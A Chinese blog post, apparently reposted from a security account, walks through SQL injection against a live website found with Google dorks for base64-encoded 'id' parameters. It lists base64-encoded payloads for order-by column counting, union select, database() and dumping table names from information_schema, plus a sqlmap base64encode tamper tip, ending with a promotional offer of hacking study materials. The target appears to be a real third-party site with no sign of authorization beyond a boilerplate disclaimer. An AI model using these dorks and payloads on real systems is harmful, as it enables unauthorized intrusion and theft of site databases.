# 原创
：  实战 | SQL注入

# 实战 | SQL注入

### **一、资产搜集**

我们都知道sql注入的传参有些是明文的，有些是经过编码或者加密的，所以我们搜索的时候不要仅限于**inurl:.php?id=1**，可以额外的尝试搜搜1的base64编码值MQ==，即可以搜索**inurl:.php?id=MQ==**，或者搜索1的md5加密值，即可以搜索**inrul:.php?id=a0b923820dcc509a**。这样子搜索完，我们可测试的范围就扩大了。此处我就是利用**inurl:.php?id=MQ==**搜索到了一处存在sql注入的网站。

### **二、开始sql注入常规流程**

（1）判断字符型还是数字型

```
?id=MQ== (原始值为1)

?id=MeKAmQ== (原始值为1')
```

<br/>  

<br/> 从这两者的反应可以判断出是数字型。<br/> （2）判断是否存在sql注入漏洞

```

?id=MSBhbmQgMT0x (原始值1 and 1=1) 有内容

?id=MSBhbmQgMT0y (原始值1 and 1=2) 没有内容，页面下方空白
```

<br/> 可以判断出此处可能存在sql注入。<br/> （3）判断列数

```

?id=MSBvcmRlciBieSAz (原始值1 order by 3) 页面内容正常输出

?id=MSBvcmRlciBieSA0 (原始值1 order by 4) 报错
```

<br/>  

<br/> 可以判断列数为3。<br/> （4）判断显错位。

```

?id=LTEgdW5pb24gc2VsZWN0IDEsMiwz (原始值-1 union select 1,2,3)
```

<br/> 显错位为2和3。<br/> （5）在显错位2的位置上尝试获取当前数据库

```
?id=LTEgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwz (原始值-1 union select 1,database(),3)
```

<br/> （6）获取当前数据库中的表

```
id=LTEgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLDMgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgp



原始值：-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
```

<br/> （7）接下来就是获取其中某一个表的字段名和字段值了，只需将相应的SQL语句进行BASE64编码，然后输入即可。<br/>  

### **三、sqlmap验证**

由于传参是需要进行base64编码的，所以此处我们在使用sqlmap的时候需要用到tamper脚本中的base64encode.py脚本，只需要在常规的语句中机上**--tamper base64encode.py**即可。<br/>  

### **总结：测试sql注入的时候不要只局限于明文传输，也要注意编码或者加密后的值。**

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

**没看够~？欢迎关注！**

## **免费领取安全学习资料包！（私聊进群一起学习，共同进步）**<img alt="" height="768" src="https://img-blog.csdnimg.cn/7fc67ab4af5b493483ab17da4b91b3b0.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/b707be464bfb4fb4b71198e6a9cc1724.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/662b33e8c6f5495ba8f8f484259d749a.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/a1f572a4347045d2b86753eca5f24ba5.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/bb9decb8f6004a4c8bc3b3d683db1815.png" width="665"/>

应急响应笔记

学习路线
